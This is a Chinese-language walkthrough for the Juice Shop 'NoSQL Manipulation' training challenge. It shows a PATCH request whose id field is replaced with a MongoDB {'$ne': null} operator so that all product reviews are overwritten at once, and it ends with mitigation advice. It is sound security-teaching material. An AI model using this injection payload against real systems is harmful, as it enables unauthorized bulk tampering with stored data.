# Juice-Shop 攻略：NoSQL 操纵

## 挑战概述

**标题：** NoSQL Manipulation  
**类别：** 注入  
**难度：** ⭐⭐⭐⭐ (4/6)

本挑战要求利用 NoSQL 注入漏洞，在 NoSQL 数据库中同时更新多条商品评论。

## 使用的工具

- **拦截代理（如 Burp Suite）：** 用于捕获和修改 HTTP 请求。
- **NoSQL 注入技术知识：** 了解 MongoDB 查询运算符。

## 方法与解法

### 步骤 1：分析正常更新请求

最初，我使用 Burp Suite 捕获了一个正常的 HTTP PATCH 请求。该请求用于更新单条商品评论，内容大致如下：

```http
PATCH /rest/products/reviews HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
  "id": "specific_review_id",
  "message": "updated_review_text"
}
```

在 Burp suite 中，请求如下：

<img src="../assets/difficulty4/nosql_manipulation_1.png" alt="burp suite request" width="500px">

### 步骤 2：构造 NoSQL 注入载荷

要利用 NoSQL 注入一次更新多条评论，需要篡改 JSON 载荷中的 `id` 参数。底层 NoSQL 数据库 MongoDB 会以特定方式解释某些模式。本次使用 `$ne`（不等于）运算符，它用于选择字段值不等于指定值的文档。使用 `{"$ne": null}` 可确保条件对所有条目成立（因为所有 `id` 都不为 `null`）。

### 步骤 3：发送修改后的请求

我修改了请求，在 `id` 字段中加入注入内容：

```http
PATCH /rest/products/reviews HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
  "id": {"$ne": null},
  "message": "updated_review_text"
}
```

发送请求后，服务器将其作为有效查询处理。由于 NoSQL 注入施加的条件，所有评论都被更新为相同的 `message`。

### 解法说明

我们通过利用商品评论更新功能中的 NoSQL 注入完成了挑战。载荷 `{"$ne": null}` 绕过了原本仅更新指定条目的限制，导致数据库中的所有条目被未授权批量更新。

这种漏洞源于后端未正确处理用户输入，尤其是直接将输入用于数据库查询而不进行清理或参数化；使用 MongoDB 等 NoSQL 数据库的应用中也常见此类问题。

### 安全建议

- **输入验证和清理：** 在服务器端处理前验证并清理所有输入。
- **使用参数化查询：** 始终使用参数化查询或数据库管理库提供的等效方式处理输入，尤其是在 NoSQL 环境中。
